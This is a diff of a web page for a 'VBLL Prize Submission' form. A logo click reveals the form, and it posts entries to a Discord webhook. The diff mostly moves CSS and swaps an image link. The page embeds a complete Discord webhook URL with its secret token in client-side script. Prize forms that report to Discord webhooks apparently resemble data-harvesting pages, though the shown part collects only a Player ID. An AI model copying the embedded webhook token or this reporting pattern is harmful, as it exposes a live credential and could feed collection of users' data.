@@ -34,12 +34,6 @@
     animation: pulse 2s infinite;
   }
 
-  @keyframes pulse {
-    0% { transform: scale(1); }
-    50% { transform: scale(1.05); }
-    100% { transform: scale(1); }
-  }
-
   #logoContainer img {
     width: 220px;
     height: auto;
@@ -62,6 +56,12 @@
     animation: shimmer 2.5s infinite;
   }
 
+  @keyframes pulse {
+    0% { transform: scale(1); }
+    50% { transform: scale(1.05); }
+    100% { transform: scale(1); }
+  }
+
   @keyframes shimmer {
     0% { background-position: -200px; }
     100% { background-position: 200px; }
@@ -81,7 +81,7 @@
     transform: translate(-50%, -50%) scale(0.8);
     opacity: 0;
     pointer-events: none;
-    transition: all 1s ease;
+    transition: all 0.5s ease;
     z-index: 10;
   }
 
@@ -130,18 +130,16 @@
 
   .success { margin-top: 15px; font-weight: bold; color: #00ff99; opacity: 0; transition: all 0.5s ease; }
   .success.show { opacity: 1; }
-
 </style>
 </head>
 <body>
 
-<!-- Logo Landing -->
 <div id="logoContainer">
-  <img src="https://i.imgur.com/0NQ2j5b.png" alt="VBLL Logo">
+  <!-- Direct image link from Imgur -->
+  <img src="https://i.imgur.com/k1b7v3R.png" alt="VBLL Logo">
   <p>Click the logo to access the form</p>
 </div>
 
-<!-- Form -->
 <div class="form-container" id="formContainer">
   <h1>VBLL Prize Submission</h1>
   <form id="prizeForm">
@@ -166,13 +164,11 @@ logo.addEventListener("click", () => {
   formContainer.classList.add("show");
 });
 
-// Webhook URL
+// Discord webhook
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1449604098251816980/m_mbuU1CNh9nPGJAoQYA6AcrViRNbYQaYeVYAKNUH_Go0s2e8Fj1H99tT2fdEM7zTB5O";
 
-// Submit form
 form.addEventListener("submit", (e) => {
   e.preventDefault();
-
   const data = {
     content: `🏆 **VBLL Prize Log**
 **Player ID:** ${document.getElementById("playerId").value}
